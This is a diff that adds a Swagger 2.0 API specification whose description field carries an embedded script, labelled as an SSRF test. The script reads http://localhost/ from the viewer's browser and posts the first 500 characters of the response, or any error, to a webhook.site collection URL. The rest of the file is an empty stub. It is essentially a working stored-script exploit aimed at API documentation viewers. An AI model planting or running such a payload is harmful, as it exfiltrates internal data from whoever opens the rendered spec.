@@ -1,0 +1,30 @@
+swagger: "2.0"
+info:
+  title: SSRF via Client JavaScript
+  description: |
+    <script>
+      // Client-side SSRF (não tem CORS restriction do file://)
+      fetch('http://localhost/')
+        .then(response => response.text())
+        .then(data => {
+          // Enviar para webhook
+          fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              url: 'http://localhost/',
+              status: 'success',
+              data_preview: data.substring(0, 500)
+            })
+          });
+        })
+        .catch(error => {
+          fetch('https://webhook.site/f3880c57-1d67-42ff-b415-4d02c16d37a5', {
+            method: 'POST',
+            body: 'localhost error: ' + error
+          });
+        });
+      
+      alert('SSRF test via JavaScript initiated');
+    </script>
+paths: {}
